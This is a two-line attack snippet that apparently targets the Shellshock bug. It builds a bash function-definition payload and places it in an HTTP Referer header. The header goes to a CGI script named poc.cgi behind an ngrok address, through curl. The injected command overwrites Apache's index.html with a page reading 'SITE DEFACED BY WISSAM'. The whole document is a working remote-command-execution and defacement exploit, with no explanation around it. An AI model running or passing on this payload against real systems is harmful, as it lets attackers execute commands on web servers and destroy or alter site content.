$payload = "() { :;}; echo; /bin/echo '<html><body style=""background-color:#0d0208;color:#00ff41;text-align:center;padding-top:100px;font-family:monospace;""><h1>[!] SYSTEM CRITICAL FAILURE [!]</h1><h2>SITE DEFACED BY WISSAM</h2></body></html>' > /usr/local/apache2/htdocs/index.html"

curl.exe -H "Referer: $payload" https://calvin-nonporous-rosendo.ngrok-free.dev/cgi-bin/poc.cgi